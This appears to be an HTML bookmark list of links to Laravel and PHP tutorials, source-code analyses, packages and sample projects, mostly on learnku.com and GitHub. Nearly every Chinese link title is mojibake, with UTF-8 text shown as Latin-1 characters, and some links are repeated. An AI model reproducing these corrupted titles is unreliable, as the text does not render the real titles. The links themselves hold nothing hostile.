<p><a href="https://github.com/eleven26/listen-sql" target="_blank" rel="noopener">æ§åˆ¶å°å®æ—¶æŸ¥çœ‹ sql</a></p>
<p><a href="https://learnku.com/articles/33400" target="_blank" rel="noopener">HTTP åè®®å…è´¹å‡çº§åˆ° HTTPS</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener"> Laravel-echo-server å¼€å‘èŠå¤©å®¤å’Œå®¢æœåŠŸèƒ½</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravelä¹‹é“</a></p>
<p><a href="https://googee.github.io/Entity-Builder/dist/" target="_blank" rel="noopener">Laravel ä»£ç ç”Ÿæˆå·¥å…·</a></p>
<p><a href="https://learnku.com/articles/32007#replies" target="_blank" rel="noopener">Laravel æºç é˜…è¯» - Eloquent</a></p>
<p><a href="https://github.com/alexeymezenin/laravel-best-practices/blob/master/chinese.md" target="_blank" rel="noopener">laravelæœ€ä½³å®è·µ</a></p>
<p><a href="https://github.com/sweida/laravel-blog-api/" target="_blank" rel="noopener">Laravel+vue ä¸ªäººåšå®¢</a></p>
<p><a href="https://laravelacademy.org/laravel-from-appreciate-to-artisan" target="_blank" rel="noopener">Laravel ä»å­¦å¾’åˆ°å·¥åŒ ç²¾æ ¡ç‰ˆ </a></p>
<p><a href="https://learnku.com/articles/32333" target="_blank" rel="noopener">æœåŠ¡å®¹å™¨</a></p>
<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">Laravel5.8 ç‰ˆæœ¬å†…æ ¸æºç æ³¨è§£</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin æºç åˆ†æç³»åˆ—</a></p>
<p><a href="https://learnku.com/articles/32007" target="_blank" rel="noopener">Laravel æºç é˜…è¯»</a></p>
<p><a href="https://github.com/y-ui/laravel-data-masking" target="_blank" rel="noopener">Laravel æ•°æ®åº“è„±æ•å·¥å…·</a></p>
<p><a href="https://github.com/xiaohuilam/laravel/wiki" target="_blank" rel="noopener">Laravel æ·±å…¥æµ…å‡ºæŒ‡å—  </a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">Laravel5.5LTS ç‰ˆæœ¬æºç å†…æ ¸é˜…è¯»æ³¨è§£</a></p>
<p><a href="https://leoyang90.gitbooks.io/laravel-source-analysis/content/" target="_blank" rel="noopener">laravel æºç è¯¦è§£https://github.com/LeoYang90/laravel-source-analysis</a></p>
<p><a href="https://github.com/shanyul/photosLive" target="_blank" rel="noopener">Laravel + Vue + Oss æ­å»ºçš„å›¾ç‰‡å¢™</a></p>
<p><a href="https://github.com/tangtanglove/fullstack-backend" target="_blank" rel="noopener">åŸºäº Laravel + Ant-design-pro ç•Œé¢ç¾è§‚æ¼‚äº®çš„åå°</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin å®‰è£…åˆ†æ</a></p>
<p><a href="https://github.com/imnotdoubi/laravel-admin.git" target="_blank" rel="noopener">ç”µå­å•†åŠ¡åå°ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/laravel/t/31585" target="_blank" rel="noopener">åŸºäºlaravelçš„åšå®¢</a></p>
<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">laravel5.8ç‰ˆæœ¬æºç åˆ†æ</a></p>
<p><a href="https://learnku.com/laravel/t/30996" target="_blank" rel="noopener">åŸºäº adminLTE3ã€Laravelã€swoole çš„å¾®æœåŠ¡ç®¡ç†å¹³å°</a></p>
<p><a href="https://learnku.com/articles/25922#topnav" target="_blank" rel="noopener">Laravel-snappy ç”Ÿæˆ PDF è¸©å‘è®°å½•</a></p>
<p><a href="https://learnku.com/articles/30878" target="_blank" rel="noopener">docker/laradock å®‰è£…</a></p>
<p><a href="https://learnku.com/articles/30858" target="_blank" rel="noopener">Laravel èåˆ Markdown</a></p>
<p><a href="https://notes.lzis.me/notes/53" target="_blank" rel="noopener">Laravelæ¡†æ¶å…³é”®æŠ€æœ¯è§£æ</a></p>
<p><a href="https://learnku.com/articles/26864" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://github.com/yybawang/Adoc" target="_blank" rel="noopener">laravel markdown apiæ–‡æ¡£</a></p>
<p><a href="https://learnku.com/articles/30607" target="_blank" rel="noopener"> markdown æ¥æ’°å†™æ–‡æ¡£</a></p>
<p><a href="https://learnku.com/articles/30812" target="_blank" rel="noopener">Laravel èåˆ Elasticsearch/Algolia</a></p>
<p><a href="https://learnku.com/articles/22514" target="_blank" rel="noopener">Laravel Artisan å‘½ä»¤å¤§å…¨</a></p>
<p><a href="https://learnku.com/laravel/t/30061" target="_blank" rel="noopener">Laravel åº•å±‚åˆ†æç³»åˆ—æ–‡ç« ï¼šç”Ÿå‘½å‘¨æœŸ</a></p>
<p><a href="http://youyou-tech.com/2019/05/30/%E5%A4%A7%E8%AF%9D%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" target="_blank" rel="noopener">å¤§è¯åç«¯å¼€å‘é«˜é«˜å¹¶å‘çš„å¥‡æŠ€æ·«å·§</a></p>
<p><a href="https://github.com/medz/cors" target="_blank" rel="noopener"> PHP è·¨åŸŸçš„ CORS ä¸­é—´ä»¶</a></p>
<p><a href="https://github.com/nfangxu/package-fx-translation" target="_blank" rel="noopener">Laravel è°·æ­Œç¿»è¯‘</a></p>
<p><a href="https://learnku.com/articles/29669" target="_blank" rel="noopener">Laravel æ­å»º Composer åŒ…</a></p>
<p><a href="https://learnku.com/articles/29622" target="_blank" rel="noopener"> Laravel å’Œ layui åŒ…å«åŸºç¡€ RBAC æƒé™çš„ç®¡ç†åå°</a></p>
<p><a href="https://learnku.com/laravel/t/29566" target="_blank" rel="noopener">ç”Ÿå‘½å‘¨æœŸå’Œå®¹å™¨ Container</a></p>
<p><a href="https://github.com/maatwebsite/Laravel-Excel" target="_blank" rel="noopener">Supercharged Excel exports and imports in Laravel</a></p>
<p><a href="https://learnku.com/articles/25270#replies" target="_blank" rel="noopener">MySQL é¿å‘å®å…¸</a></p>
<p><a href="https://learnku.com/articles/29490" target="_blank" rel="noopener">æ–‡ç« æ”¶è—çš„æ‰©å±•åŒ…</a></p>
<p><a href="https://learnku.com/articles/29413" target="_blank" rel="noopener">å¤šè¯­è¨€ä¸å¤šæ—¶åŒºçš„è§£å†³æ–¹æ¡ˆ</a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">laravelæ¡†æ¶æºç åˆ†ææ³¨è§£</a></p>
<p><a href="https://github.com/ww285276792/todo.link" target="_blank" rel="noopener">Laravel å›¢é˜Ÿä»»åŠ¡ç®¡ç†ç³»ç»Ÿ</a></p>
<p><a href="https://github.com/tangtanglove/fullstack" target="_blank" rel="noopener">åŸºäº Laravel + Ant-design ç•Œé¢ç¾è§‚æ¼‚äº®çš„åå°</a></p>
<p><a href="https://github.com/hongyukeji/laravel-translate/" target="_blank" rel="noopener">Laravel æœ¬åœ°è¯­è¨€åŒ…è‡ªåŠ¨ç¿»è¯‘æ’ä»¶</a></p>
<p><a href="https://learnku.com/articles/28897" target="_blank" rel="noopener">Laravel+Layim+GatewayWorker workerman å®ç°å®æ—¶èŠå¤©åŠŸèƒ½</a></p>
<p><a href="https://github.com/ivothgle/Tampermonkey/blob/master/Laravel-doc-help.user.js" target="_blank" rel="noopener">ã€ŒLaravel æ–‡æ¡£åŠ©æ‰‹ã€ - æ²¹çŒ´è„šæœ¬</a></p>
<p><a href="https://github.com/hongyukeji/laravel-sms" target="_blank" rel="noopener">Laravel çŸ­ä¿¡æ‰©å±•åŒ…</a></p>
<p><a href="https://learnku.com/articles/28432#topnav" target="_blank" rel="noopener">Laravel ä¸­çš„äº‹ä»¶ç›‘å¬</a></p>
<p><a href="https://github.com/alicfeng/laravel-runtime" target="_blank" rel="noopener">åŸºäºLaravelæ„å»ºè¯·æ±‚ä¿¡æ¯æ—¥å¿—ä»¥åŠæ¥å£æ™ºèƒ½åˆ†æ</a></p>
<p><a href="https://learnku.com/docs/laravel-cheatsheet/5.8" target="_blank" rel="noopener">Laravel 5.8 é€ŸæŸ¥è¡¨</a></p>
<p><a href="https://github.com/Kamicloud/laravel-unofficial-relations" target="_blank" rel="noopener">Laravel å…³è”æ¨¡å‹æ‰©å±•</a></p>
<p><a href="https://learnku.com/laravel/t/24449#replies" target="_blank" rel="noopener">Laravel çš„ç¬¬ä¸‰æ–¹å¹³å°ç™»å½•</a></p>
<p><a href="https://learnku.com/articles/28230" target="_blank" rel="noopener">Laravel- è®¿é—®è®¾å¤‡è¯†åˆ«ç»„ä»¶-BrowserDetect</a></p>
<p><a href="https://www.laravel-dojo.com/helpful-tools" target="_blank" rel="noopener">Laravel é“åœº</a></p>
<p><a href="https://learnku.com/articles/19427" target="_blank" rel="noopener">Laravel5.5 æ”¯ä»˜å®æ”¯ä»˜</a></p>
<p><a href="http://wangyapeng.me/2019/03/30/laravel-broadcasting/" target="_blank" rel="noopener">Laravel å¹¿æ’­</a></p>
<p><a href="http://wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/" target="_blank" rel="noopener">Laravel 5.5 å‡çº§åˆ° 5.7 å°è®°</a></p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">ç”Ÿæˆchmæ–‡æ¡£</a></p>
<p><a href="https://learnku.com/articles/19859#topnav" target="_blank" rel="noopener">æ·±å…¥ç ”ç©¶ Laravel æºç ç¬¬äºŒå¤©</a></p>
<p><a href="https://github.com/iiDestiny/dependency-injection" target="_blank" rel="noopener">ä¾èµ–æ³¨å…¥æ‰©å±•åŒ…</a></p>
<p><a href="https://github.com/php-casbin/php-casbin" target="_blank" rel="noopener"> PHP æƒé™ç®¡ç†æ¡†æ¶ Casbin</a></p>
<p><a href="https://github.com/foryoufeng/laravel-generator" target="_blank" rel="noopener">laravel ä»£ç ç”Ÿæˆå™¨ 2.0</a></p>
<p><a href="https://learnku.com/blog/Wi1dcard/tags/easy-deployment-of-laravel-applications_50034" target="_blank" rel="noopener">è½»æ¾éƒ¨ç½² Laravel åº”ç”¨</a></p>
<p><a href="https://divinglaravel.com/" target="_blank" rel="noopener">æ·±å…¥äº†è§£ Laravel çš„å·¥ä½œæœºåˆ¶</a></p>
<p><a href="https://learnku.com/articles/27934#reply87814" target="_blank" rel="noopener">Laravel ä¸­ IoC å®¹å™¨</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravelä¹‹é“ç³»åˆ—</a></p>
<p><a href="https://github.com/kevinyan815/Learning_Laravel_Kernel" target="_blank" rel="noopener">Laravelæ ¸å¿ƒä»£ç å­¦ä¹ </a></p>
<p><a href="https://learnku.com/laravel/t/14204/so-what-is-this-register-for" target="_blank" rel="noopener">laravelæœåŠ¡å®¹å™¨</a></p>
<p><a href="https://learnku.com/laravel/t/10781/who-can-compare-the-life-cycle-of-laravel-to-a-more-vivid-image" target="_blank" rel="noopener">Laravel çš„ç”Ÿå‘½å‘¨æœŸæ¯”å–»çš„æ›´å½¢è±¡ä¸€ç‚¹</a></p>
<p><a href="https://learnku.com/articles/26282#topnav" target="_blank" rel="noopener">paypal PHP-sdk æ”¯ä»˜ / å›è°ƒ / é€€æ¬¾å…¨æµç¨‹</a></p>
<p><a href="https://github.com/SadCreeper/laravel-react-blog" target="_blank" rel="noopener">Laravel 5.5 å’Œ React çš„ä¸ªäººåšå®¢ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/articles/27716" target="_blank" rel="noopener">Laravel ä»é›¶å•æ’ç³»åˆ—æ•™ç¨‹</a></p>
<p><a href="https://github.com/eddy8/lightCMS/blob/master/app/functions.php#L65-L103" target="_blank" rel="noopener">åŸºäº Tire æ ‘çš„æ•æ„Ÿè¯æ£€æµ‹</a></p>
<p><a href="https://learnku.com/articles/22307#topnav" target="_blank" rel="noopener">QQ ç¬¬ä¸‰æ–¹ç™»å½•</a></p>
<p><a href="https://learnku.com/articles/27712#topnav" target="_blank" rel="noopener">PHP æœ‰é™çŠ¶æ€æœº</a></p>
<p><a href="https://github.com/godruoyi/gblog" target="_blank" rel="noopener">laravel vueåšå®¢</a></p>
<p><a href="https://learnku.com/articles/18704" target="_blank" rel="noopener">Voyager çš„ä½¿ç”¨åŠäºŒæ¬¡å¼€å‘</a></p>
<p><a href="https://learnku.com/articles/26344" target="_blank" rel="noopener"> Composer è‡ªåŠ¨åŠ è½½æºç </a></p>
<p><a href="https://learnku.com/articles/26735#topnav" target="_blank" rel="noopener">GitLab CI è¸©å‘</a></p>
<p><a href="https://learnku.com/articles/19868#topnav" target="_blank" rel="noopener">å°ç™½æŠ˜è…¾æœåŠ¡å™¨ï¼ˆä¸€ï¼‰ï¼šdocker æ­å»º lnmp+ ä½¿ç”¨ deployer éƒ¨ç½²</a></p>
<p><a href="https://learnku.com/laravel/t/9365/teach-you-to-write-modern-php-code-without-using-a-framework" target="_blank" rel="noopener">ä¸ä½¿ç”¨æ¡†æ¶çš„æƒ…å†µä¸‹ä¹Ÿèƒ½å†™å‡ºç°ä»£åŒ– PHP ä»£ç </a></p>
<p><a href="https://learnku.com/laravel/t/26103" target="_blank" rel="noopener">åŸºäº Laravel çš„ CMS</a></p>
<p><a href="https://github.com/Adldap2/Adldap2-Laravel" target="_blank" rel="noopener">Laravel LDAP åŒ…</a></p>
<p><a href="https://learnku.com/articles/27824#reply87460" target="_blank" rel="noopener">PhpSpreadsheet ç®€å• Excel å¯¼å…¥å¯¼å‡º</a></p>
<p><a href="https://learnku.com/articles/25130" target="_blank" rel="noopener">valet åˆ‡æ¢ PHP ç‰ˆæœ¬</a></p>
<p><a href="https://github.com/cknow/laravel-money" target="_blank" rel="noopener">Laravel Money é‡‘é’±å•ä½æ ¼å¼åŒ–</a></p>
<p><a href="https://learnku.com/articles/27806#topnav" target="_blank" rel="noopener">Laravel ä¸­è‡ªå®šä¹‰ç”¨æˆ·ç™»å½•çš„æ•°æ®è¡¨users</a></p>
<p><a href="https://learnku.com/articles/14145/rely-on-inversion-control-inversion-ioc-container-dependency-injection#topnav" target="_blank" rel="noopener">æµ…æä¾èµ–å€’è½¬ã€æ§åˆ¶åè½¬ã€IoC å®¹å™¨ã€ä¾èµ–æ³¨å…¥</a></p>
<p><a href="https://learnku.com/articles/22769#topnav" target="_blank" rel="noopener">ç”¨è¯­è¨€ (éä»£ç ) è¯´æ¸…æ¥š IoC åˆ°åº•æ˜¯ä»€ä¹ˆ</a></p>
<p><a href="https://1024casts.com/topics/21" target="_blank" rel="noopener">PHPä¸­çš„ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰å®¹å™¨</a></p>
<p><a href="https://learnku.com/laravel/t/27647#e9289b" target="_blank" rel="noopener">åäº”ä¸ªå¸¸ç”¨çš„ Laravel é›†åˆ</a></p>
<p><a href="https://learnku.com/articles/19195#topnav" target="_blank" rel="noopener">Laravel æœåŠ¡å®¹å™¨ï¼ŒIoC,DI</a></p>
<p><a href="https://learnku.com/articles/17638" target="_blank" rel="noopener">Laravel æœåŠ¡å®¹å™¨ã€æœåŠ¡æä¾›å™¨ã€å¥‘çº¦å®ä¾‹è®²è§£</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">Laravel æœåŠ¡å®¹å™¨ï¼ŒIoC,DI</a></p>
<p><a href="https://learnku.com/articles/27606#topnav" target="_blank" rel="noopener">ã€Šæé—®çš„æ™ºæ…§ã€‹å°æµ‹éªŒ</a></p>
<p><a href="https://learnku.com/articles/27623" target="_blank" rel="noopener">Laravel ä½¿ç”¨ Elasticsearch å…¨å±€æœç´¢</a></p>
<p><a href="http://worthly.cn/2018/05/27/algorithm-test/" target="_blank" rel="noopener">PHPå®ç°çš„ä¸€äº›ç®—æ³•ä¾‹å­</a></p>
<p><a href="http://worthly.cn/2018/06/02/computer-network-reading-notes/" target="_blank" rel="noopener">è®¡ç®—æœºç½‘ç»œè¯»ä¹¦ç¬”è®°</a></p>
<p><a href="http://worthly.cn/2017/12/19/php-regular-preg-match-matching-length-limit/" target="_blank" rel="noopener">æ­£åˆ™preg_matchåŒ¹é…é•¿åº¦</a></p>
<p><a href="https://learnku.com/laravel/t/27590" target="_blank" rel="noopener">ä¼˜é…· YouKu OAuth2 ç¬¬ä¸‰æ–¹ç™»å½•åº“</a></p>
<p><a href="https://github.com/changeweb/Unifiedtransform" target="_blank" rel="noopener">å¼€æºå­¦æ ¡ç®¡ç†ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/articles/27556" target="_blank" rel="noopener">è¶…å…¨çš„è®¾è®¡æ¨¡å¼ç®€ä»‹</a></p>
<p><a href="https://www.tangshuang.net/1682.html" target="_blank" rel="noopener">å¦‚ä½•åº”å¯¹æœåŠ¡å™¨å‹åŠ›</a></p>
<p><a href="https://www.tangshuang.net/6192.html" target="_blank" rel="noopener">æ•°æ®åº“ä¸­ç”¨ä¸€ä¸ªå€¼æ¥ä¿å­˜å¤šç§æƒ…å†µï¼šäºŒè¿›åˆ¶å’ŒæŒ‰ä½å¼‚æˆ–</a></p>
<p><a href="https://www.tangshuang.net/1693.html" target="_blank" rel="noopener">åœ¨é˜¿é‡Œäº‘ä¸Šæ­å»ºè‡ªå·±çš„gitæœåŠ¡å™¨</a></p>
<p><a href="https://learnku.com/articles/27446" target="_blank" rel="noopener">RabbitMQ çš„åº”ç”¨åœºæ™¯ä»¥åŠåŸºæœ¬åŸç†ä»‹ç»</a></p>
<p><a href="https://www.tangshuang.net/1774.html" target="_blank" rel="noopener">ç¼–è¯‘å®‰è£…nginx1.9.7+php7.0.0</a></p>
<p><a href="https://learnku.com/articles/25947" target="_blank" rel="noopener"> Laravel å¼€å‘ API æ›´å¾—å¿ƒåº”æ‰‹</a></p>
<p><a href="https://learnku.com/articles/22616" target="_blank" rel="noopener">åˆ«å†ä½¿ç”¨ JWT ä½œä¸º Session ç³»ç»Ÿ</a></p>
<p><a href="https://www.tangshuang.net/4100.html" target="_blank" rel="noopener">åŒä¸€å…¬å¸ä¸‹å¤šäº§å“çš„ç”¨æˆ·æƒé™ç®¡ç†ç³»ç»Ÿè®¾è®¡</a></p>
<p><a href="https://github.com/xx19941215/light-tips" target="_blank" rel="noopener">æ•°æ®ç»“æ„å’Œç®—æ³•</a></p>
<p><a href="https://www.tangshuang.net/2794.html" target="_blank" rel="noopener">PHPä¸­å…³äºæ—¶é—´ï¼ˆæˆ³ï¼‰ã€æ—¶åŒº</a></p>
<p><a href="https://github.com/peinhu/AetherUpload-Laravel" target="_blank" rel="noopener">å¤§æ–‡ä»¶ä¸Šä¼ æ‰©å±•</a></p>
<p><a href="https://learnku.com/laravel/t/26674" target="_blank" rel="noopener">Laravel å¾®ä¿¡å°ç¨‹åºåç«¯æ­å»º</a></p>
<p><a href="https://tianyong90.com/2019/03/10/yong-algolia-docsearch-qing-song-shi-xian-wen-dang-quan-zhan-sou-suo/#algolia-docsearch-çš„åŸºæœ¬åŸç†å’Œä¸»è¦ä¼˜åŠ¿" target="_blank" rel="noopener"> Algolia DocSearch è½»æ¾å®ç°æ–‡æ¡£å…¨ç«™æœç´¢</a></p>
<p><a href="https://learnku.com/articles/26987" target="_blank" rel="noopener">SOLID è®¾è®¡åŸåˆ™</a></p>
<p><a href="https://blog.yiranzai.cn/posts/991/" target="_blank" rel="noopener">MySQLåˆ†ç»„æŸ¥è¯¢TOP Nçš„å®è·µå’Œè¸©å‘</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">ä¸è¦åœ¨å¾ªç¯ä½“ä¸­ä½¿ç”¨ array_merge ()</a></p>
<p><a href="https://github.com/uuk020/logistics" target="_blank" rel="noopener">æŸ¥è¯¢ç‰©æµä¿¡æ¯çš„æ‰©å±•åŒ…</a></p>
<p><a href="https://learnku.com/laravel/t/27041" target="_blank" rel="noopener">PHPStrom è½¬ VSCode æŠ˜è…¾è®°å½•</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">ã€çœ‹å®Œå°±æ‡‚ã€‘Laravel æœåŠ¡å®¹å™¨ï¼ŒIoC,DI</a></p>
<p><a href="https://learnku.com/articles/25760" target="_blank" rel="noopener">æ•´ç† PC ç«¯å¾®ä¿¡æ‰«ç æ”¯ä»˜å…¨è¿‡ç¨‹ â€” easywechat + Laravel 5.8</a></p>
<p><a href="https://learnku.com/laravel/t/24161" target="_blank" rel="noopener">Laravel Excel çš„äº”ä¸ªéšè—åŠŸèƒ½</a></p>
<p><a href="https://learnku.com/articles/22094" target="_blank" rel="noopener">woann-chat åŸºäº laravelS å’Œ layim çš„èŠå¤©ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/laravel/t/19023" target="_blank" rel="noopener">Laravel-Excel 3.0 æ–‡æ¡£</a></p>
<p><a href="https://learnku.com/articles/19589" target="_blank" rel="noopener"> Laravel è¿›é˜¶æ•™ç¨‹</a></p>
<p><a href="https://learnku.com/articles/18637" target="_blank" rel="noopener">Laravel Redis å¹¿æ’­ å®ä¾‹</a></p>
<p><a href="https://learnku.com/laravel/t/26281" target="_blank" rel="noopener">åŸºäº The 996 Prohibited License çš„é¡¹ç›®Laravel-admin-select2</a></p>
<p><a href="https://learnku.com/articles/22046" target="_blank" rel="noopener">å¤„ç† API æ•°æ®æ ¼å¼</a></p>
<p><a href="https://learnku.com/articles/26733" target="_blank" rel="noopener">Laravel é¡¹ç›®å…¨è‡ªåŠ¨æ¥å£ç®¡ç†</a></p>
<p><a href="https://learnku.com/articles/26710#topnav" target="_blank" rel="noopener">Auth 2.0 çš„ä¸€ç§ç®€å•è§£é‡Š</a></p>
<p><a href="https://dmmylove.cn/articles/97" target="_blank" rel="noopener">Laravel ä»é›¶å•æ’ç³»åˆ—æ•™ç¨‹ </a></p>
<p><a href="https://learnku.com/articles/24219" target="_blank" rel="noopener">Laravel 5.7 å’Œ JSON Web ä»¤ç‰Œï¼ˆtymon/jwt-authï¼‰ - ç”¨æˆ·è®¤è¯</a></p>
<p><a href="https://learnku.com/articles/26343#topnav" target="_blank" rel="noopener">ç”Ÿäº§ç¯å¢ƒçš„ Composer</a></p>
<p><a href="https://learnku.com/laravel/wikis/27707" target="_blank" rel="noopener">è¾“å‡º SQL è¯­å¥</a></p>
<p><a href="https://learnku.com/laravel/t/27688" target="_blank" rel="noopener">Laravel Passport ä¸ºä½ çš„ REST API å¢åŠ ç”¨æˆ·è®¤è¯åŠŸèƒ½</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">ä¸è¦åœ¨å¾ªç¯ä½“ä¸­ä½¿ç”¨ array_merge ()</a></p>
<p><a href="https://haoruijie.art/2019/04/18/the-secret-of-throttle.html" target="_blank" rel="noopener">Laravel API throttle é™æµåŸç†åˆ†æ</a></p>
<p><a href="https://learnku.com/articles/27389" target="_blank" rel="noopener">Laravel ç™»å½•åŸç†å‰–æ</a></p>
<p><a href="https://learnku.com/laravel/wikis/25515" target="_blank" rel="noopener">Laravel å®‰è£…å’Œå¼€å‘ç¯å¢ƒ</a></p>
<p><a href="https://learnku.com/articles/25858" target="_blank" rel="noopener">Cookie ç¦ç”¨äº†ï¼ŒSession è¿˜èƒ½ç”¨å—</a></p>
<p><a href="https://github.com/OMGZui/DesignPattern" target="_blank" rel="noopener">è®¾è®¡æ¨¡å¼</a></p>
<p><a href="https://learnku.com/articles/25204" target="_blank" rel="noopener">PHP è¯¦ç»†é¢è¯•æ€»ç»“</a></p>
<p><a href="https://github.com/baijunyao/design-patterns" target="_blank" rel="noopener">phpè®¾è®¡æ¨¡å¼ https://baijunyao.com/</a></p>
<p><a href="https://learnku.com/docs/php-design-patterns/2018" target="_blank" rel="noopener">ã€ŠPHP è®¾è®¡æ¨¡å¼å…¨é›† 2018ã€‹</a></p>
<p><a href="https://learnku.com/articles/26825" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://learnku.com/articles/24982" target="_blank" rel="noopener">è®¾è®¡æ¨¡å¼è¶…çº§ç®€å•çš„è§£é‡Š</a></p>
<p><a href="https://learnku.com/articles/26864#topnav" target="_blank" rel="noopener">Laravel Markdown Blog learnku.net </a></p>
<p><a href="https://learnku.com/articles/26850" target="_blank" rel="noopener">PHP å¼€å‘ç¯å¢ƒå®‰è£…é…ç½®Laradock</a></p>
<p><a href="https://github.com/valiner/identicon-avatar" target="_blank" rel="noopener">å¤´åƒè‡ªåŠ¨ç”Ÿæˆ</a></p>
<p><a href="https://learnku.com/articles/20990" target="_blank" rel="noopener"> Laravel-admin é›†æˆ Markdown ç¼–è¾‘å™¨</a></p>
<p><a href="https://learnku.com/articles/26180" target="_blank" rel="noopener">swoole é‚®ä»¶ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/laravel/t/22814" target="_blank" rel="noopener">Laravel æµ‹è¯•ä¹‹ â€”â€” PHPUnit å…¥é—¨æ•™ç¨‹</a></p>
<p><a href="https://learnku.com/articles/26343" target="_blank" rel="noopener">composer è§£æ</a></p>
<p><a href="https://learnku.com/articles/24217" target="_blank" rel="noopener">Laravel 5.7 æ’¸äº†ä¸€ä¸ªè®ºå›</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">Laravel æ–‡æ¡£åŠ©æ‰‹ã€ - æ²¹çŒ´è„šæœ¬</a></p>
<p><a href="https://learnku.com/articles/27029#topnav" target="_blank" rel="noopener">å…¨æ–°æ­å»º PHP å¼€å‘ç¯å¢ƒ</a></p>
<p><a href="https://learnku.com/articles/25444" target="_blank" rel="noopener">ç¼–å†™å…·æœ‰æè¿°æ€§çš„ RESTful API </a></p>
<p><a href="https://learnku.com/articles/25983" target="_blank" rel="noopener"> Laravel-China è¯¾ç¨‹æ–‡ç« åŒæ­¥å‘å¸ƒ</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜</a></p>
<p><a href="https://learnku.com/articles/20311" target="_blank" rel="noopener">Laravel5.5 ä½¿ç”¨ Elasticsearch åšå¼•æ“</a></p>
<p><a href="https://learnku.com/laravel/t/22639" target="_blank" rel="noopener">Laravel Eloquent å°æŠ€å·§</a></p>
<p><a href="https://learnku.com/articles/18697" target="_blank" rel="noopener">Laravel Cron å®šæ—¶ä»»åŠ¡ â€œè·³å‘â€ ç‚¹</a></p>
<p><a href="https://learnku.com/articles/25798" target="_blank" rel="noopener">Laravel + Laravel-echo + EasyWeChat å®ç°å¾®ä¿¡æ‰«ç ç™»å½•</a></p>
<p><a href="https://learnku.com/articles/20247" target="_blank" rel="noopener">ä½ å¯èƒ½ä¸å¤ªéœ€è¦ Laravel-Excel</a></p>
<p><a href="https://learnku.com/articles/21812#99dc86" target="_blank" rel="noopener">Oss Flysystem æ‰©å±•</a></p>
<p><a href="https://learnku.com/articles/21522" target="_blank" rel="noopener">Laravel5.6 æ•´åˆ RabbitMQ æ¶ˆæ¯é˜Ÿåˆ—</a></p>
<p><a href="https://learnku.com/laravel/t/26110" target="_blank" rel="noopener">Laravel é›†åˆï¼ˆCollectionï¼‰çš„åŸºç¡€ç”¨æ³•</a></p>
<p><a href="https://learnku.com/articles/20031" target="_blank" rel="noopener">ã€ OAuth2.0ã€ çŒ´å­éƒ½èƒ½æ‡‚çš„å›¾è§£</a></p>
<p><a href="https://learnku.com/laravel/t/22473" target="_blank" rel="noopener"> Laravel çš„æ¶ˆæ¯é€šçŸ¥ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/laravel/t/25013" target="_blank" rel="noopener"> Laravel é¡¹ç›®ä¸­ä½¿ç”¨ Elasticsearch åšå¼•æ“</a></p>
<p><a href="https://learnku.com/articles/17867" target="_blank" rel="noopener">ç®€èŠ Session ä¸ Token èº«ä»½éªŒè¯</a></p>
<p><a href="https://learnku.com/laravel/t/24767" target="_blank" rel="noopener">å…­ä¸ªå€¼å¾—å‚è€ƒçš„ Laravel å¼€æºé¡¹ç›®</a></p>
<p><a href="https://learnku.com/articles/19878" target="_blank" rel="noopener">Laravel å¯åŠ¨æµç¨‹åˆ†æ</a></p>
<p><a href="https://learnku.com/articles/25208" target="_blank" rel="noopener">Lumen/Laravel é›†æˆ GatewayWorker (Workerman)ï¼Œå®ç°ç®€å•çš„èŠå¤©ç³»ç»Ÿ.</a></p>
<p><a href="https://www.debuginn.cn/study-laravel-1-setting.html" target="_blank" rel="noopener">Laravelè¸©å‘æ—¥è®°ä¹‹åŸºæœ¬é…ç½®åŠDemo</a></p>
<p><a href="https://github.com/Jasongzj/laravel-qcloud-image" target="_blank" rel="noopener">è…¾è®¯äº‘æ™º AI å›¾åƒæœåŠ¡çš„ Laravel SDK</a></p>
<p><a href="https://vien.tech/article/134" target="_blank" rel="noopener">åŸºäºLaravelæ”¯æŒmarkdownçš„åšå®¢Vien Blog</a></p>
<p><a href="https://learnku.com/articles/28578" target="_blank" rel="noopener">Laravel å›¢é˜Ÿä»»åŠ¡ç®¡ç†ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">ã€ŒLaravel æ–‡æ¡£åŠ©æ‰‹ã€ - æ²¹çŒ´è„šæœ¬</a></p>
<p><a href="https://learnku.com/articles/28637" target="_blank" rel="noopener"> é˜Ÿåˆ—åŸç†åˆ†æ</a></p>
